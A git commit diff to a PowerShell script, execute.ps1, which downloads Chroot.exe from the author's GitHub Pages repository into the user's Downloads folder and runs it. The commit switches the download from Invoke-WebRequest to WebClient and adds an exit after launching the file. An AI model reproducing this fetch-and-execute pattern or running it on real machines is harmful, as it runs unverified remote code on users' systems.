a1a526d05e8dc3b4fc7109cbef27dd3d2ca8f55f
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-05 22:31:26 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -1,11 +1,10 @@
 $url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Chroot.exe"
-
 $downloadPath = Join-Path $env:USERPROFILE "Downloads\Chroot.exe"
-
-Invoke-WebRequest -Uri $url -OutFile $downloadPath -ErrorAction SilentlyContinue
-
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($url, $downloadPath)
 if (Test-Path $downloadPath) {
     Start-Process -FilePath $downloadPath -Wait
+    exit
 } else {
 
 }
